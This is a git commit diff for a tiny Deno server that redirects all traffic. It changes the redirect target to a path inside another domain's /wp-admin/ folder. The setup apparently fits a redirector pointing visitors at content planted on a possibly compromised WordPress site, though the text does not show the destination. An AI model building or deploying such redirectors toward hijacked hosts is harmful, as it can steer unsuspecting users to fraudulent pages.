32eca8cf0c4ee8d5741237765e9a957773334d69
Digital2025001 <bosmichael30@gmail.com>
2025-10-02 10:38:18 -0500

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://betterwebplace.com/", // Replace this with your actual link
+      Location: "https://naprendszerunk.hu/wp-admin/ssa/setup/", // Replace this with your actual link
     },
   });
 });
